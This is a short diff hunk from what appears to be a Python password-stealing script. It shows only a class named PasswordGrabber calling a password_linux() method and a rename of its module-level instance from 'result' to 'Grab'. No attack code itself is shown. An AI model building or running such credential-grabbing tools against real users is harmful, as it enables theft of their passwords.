@@ -77,4 +77,4 @@ class PasswordGrabber:
             self.password_linux()
 
 
-result = PasswordGrabber()
+Grab = PasswordGrabber()
